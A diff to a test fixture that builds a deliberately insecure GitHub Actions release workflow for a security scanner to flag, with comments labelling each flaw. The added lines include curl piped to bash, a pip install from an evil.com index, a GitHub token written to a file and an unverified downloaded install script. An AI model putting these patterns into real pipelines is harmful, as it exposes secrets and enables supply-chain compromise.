@@ -1,6 +1,6 @@
 # Realistic-looking release workflow exhibiting every GHA-* failure mode.
 # Sourced from patterns commonly seen in public repos; used as a fixture
-# to assert that the scanner flags all five issues in one sweep.
+# to assert that the scanner flags all twelve issues in one sweep.
 name: Release
 
 on:
@@ -9,10 +9,20 @@ on:
   push:
     tags:
       - 'v*'
+  # GHA-013: issue_comment trigger without author_association guard.
+  issue_comment:
+    types: [created]
+  # GHA-009: workflow_run trigger that ingests an upstream artifact
+  # without verifying its signature.
+  workflow_run:
+    workflows: ['Build']
+    types: [completed]
 
 jobs:
   build:
-    runs-on: ubuntu-latest
+    # GHA-012: self-hosted runner with no `ephemeral` label. State
+    # leaks across jobs (PR -> deploy).
+    runs-on: self-hosted
     steps:
       - name: Checkout PR head (unsafe)
         uses: actions/checkout@v4
@@ -29,6 +39,18 @@ jobs:
         with:
           node-version: 20
 
+      # GHA-010: local action resolved against the (PR-controlled)
+      # workspace under pull_request_target.
+      - name: Lint PR
+        uses: ./actions/lint-pr
+
+      # GHA-011: cache key embeds an attacker-controllable PR title.
+      - name: Restore build cache
+        uses: actions/cache@v4
+        with:
+          path: ~/.cache/build
+          key: build-${{ github.event.pull_request.title }}
+
       - name: Publish to AWS
         env:
           AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
@@ -37,3 +59,35 @@ jobs:
           # shape — scanner must flag it.
           DEBUG_AWS_KEY: AKIAIOSFODNN7EXAMPLE
         run: npm run deploy
+
+  # GHA-014: deploy-named job without environment: binding.
+  deploy:
+    runs-on: ubuntu-latest
+    needs: build
+    steps:
+      - run: echo "deploying to prod"
+
+  ingest-upstream:
+    # GHA-009: downloads an artifact from the workflow_run trigger
+    # WITHOUT cosign verify / `gh attestation verify` / sha256sum -c.
+    runs-on: ubuntu-latest
+    if: ${{ github.event.workflow_run.conclusion == 'success' }}
+    steps:
+      - uses: actions/download-artifact@v4
+        with:
+          name: build-output
+          run-id: ${{ github.event.workflow_run.id }}
+      - run: ./build-output/install.sh
+
+  # GHA-016: curl piped to bash.
+  # GHA-017: docker run --privileged.
+  # GHA-018: pip install from insecure source.
+  # GHA-019: GITHUB_TOKEN written to file.
+  # GHA-020: no vuln scanning step.
+  insecure-build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl https://example.com/install.sh | bash
+      - run: docker run --privileged myimage
+      - run: pip install --index-url http://evil.com/simple/ pkg
+      - run: echo $GITHUB_TOKEN > token.txt
